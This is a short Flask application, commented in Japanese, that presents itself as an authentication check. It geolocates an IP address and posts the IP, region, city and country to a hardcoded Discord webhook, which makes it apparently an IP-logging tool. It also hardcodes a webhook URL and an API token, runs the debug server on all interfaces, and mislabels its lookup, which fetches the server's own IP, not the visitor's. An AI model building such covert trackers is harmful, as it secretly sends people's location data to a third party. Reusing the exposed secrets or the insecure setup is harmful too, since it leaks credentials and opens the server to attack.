from flask import Flask, jsonify, request
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1352149625905352776/kHe96xlEGu9WbbhNy1yUDrRFjt9m0C7aEkVyUzS2arCOXuEh2QhJ9ZAkQ10OgmY_f6dY"  # Webhook URL

def get_real_ip():
    """外部のIP取得サービスを使って本当のIPを取得"""
    try:
        response = requests.get("https://httpbin.org/ip")
        if response.status_code == 200:
            return response.json().get("origin", "不明なIP")
    except Exception as e:
        print("IP取得エラー:", e)
    return "不明なIP"

@app.route('/get-ip', methods=['GET'])
def get_ip():
    # クライアントのグローバルIPを取得
    user_ip = get_real_ip()

    # IP情報を取得（ipinfo.io API）
    access_token = "232da865392bdd"  # ipinfo.ioのAPIトークン
    response = requests.get(f"https://ipinfo.io/{user_ip}/json?token={access_token}")
    
    if response.status_code == 200:
        data = response.json()
        region = data.get("region", "都道府県情報なし")
        city = data.get("city", "市区町村情報なし")
        country = data.get("country", "国情報なし")

        # Discord通知
        discord_message = {
            "content": f"✅ **認証完了**\n🌐 **IP:** {user_ip}\n🏙️ **地域:** {region}\n🏠 **市区町村:** {city}\n🌍 **国:** {country}"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=discord_message)

        return jsonify({"ip": user_ip, "region": region, "city": city, "country": country})

    return jsonify({"error": "IP情報の取得に失敗しました"}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
